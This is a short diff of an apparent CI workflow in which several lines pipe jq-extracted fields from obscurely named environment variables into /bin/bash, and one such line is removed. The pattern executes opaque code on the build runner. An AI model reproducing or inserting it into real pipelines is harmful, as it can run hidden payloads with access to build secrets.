@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$piyb8616" | jq -r .cbdo399 | /bin/bash
           echo $byayf4 | jq -r .am7155 | /bin/bash
-          echo $jcru9130 | jq -r .iv66 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
